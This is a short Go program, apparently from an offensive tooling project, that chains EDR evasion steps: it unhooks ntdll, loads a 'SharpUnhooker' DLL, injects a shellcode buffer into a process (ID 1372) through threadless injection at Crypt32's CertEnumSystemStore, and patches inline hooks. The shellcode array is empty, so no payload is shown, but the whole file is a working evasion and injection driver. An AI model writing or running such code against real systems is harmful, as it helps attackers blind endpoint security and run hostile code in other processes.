package main

import (
	"UnhookingGoLang/NtdllUnhook"
	"UnhookingGoLang/PatchInlineHooking"
	"UnhookingGoLang/ThreadlessInject"
	"syscall"
)

func main() {
	NtdllUnhook.Dll()

	syscall.LoadLibrary("SharpUnhooker/SharpUnhooker.dll")

	shellcode := []byte{}
	ThreadlessInject.Inject("Crypt32", "CertEnumSystemStore", 1372, shellcode)

	PatchInlineHooking.Inline()
}
